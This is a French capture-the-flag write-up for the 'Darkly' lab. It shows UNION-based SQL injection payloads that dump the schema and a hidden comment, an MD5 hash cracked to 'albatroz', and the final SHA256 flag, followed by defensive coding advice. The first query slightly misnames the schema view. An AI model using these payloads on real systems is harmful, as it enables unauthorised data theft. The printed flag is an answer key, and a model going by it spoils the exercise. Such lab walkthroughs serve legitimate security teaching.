# Darkly - Writeup : Accès à une page via paramètre hashé

## Analyse

Après avoir testé plusieurs IDs, on tombe sur un premier indice :

```

ID: 5
Title: Hack me ?
Url: borntosec.ddns.net/images.png

````

On remarque rapidement que la page permettant de rechercher une image est **vulnérable aux injections SQL**.  
En utilisant une requête avec `UNION`, il est possible de récupérer les tables ainsi que leurs colonnes.

### Récupération des tables

```sql
1 UNION SELECT table_name, column_name FROM information_schema.tables
````

Parmi les résultats, la table `list_images` attire l’attention.

### Exploration des données

On identifie un champ intéressant : `comment`.

On peut alors extraire son contenu avec la requête suivante :

```sql
1 UNION SELECT comment, title FROM list_images WHERE id = 5
```

### Résultat

```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

## Exploitation

1. Hash MD5 récupéré :

```
1928e8083cf461a51303633093573c46
```

2. Décodage MD5 :

```
albatroz
```

3. Hash en SHA256 :

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Ressources

* [Outil SHA256 en ligne](https://emn178.github.io/online-tools/sha256.html)
* [Décryptage MD5 en ligne](https://md5decrypt.net/)

## Bonnes pratiques

* Utiliser des **requêtes préparées (prepared statements)**
* Ne jamais concaténer directement les entrées utilisateur dans une requête SQL
* Limiter les permissions de la base de données
* Implémenter des contrôles de validation côté serveur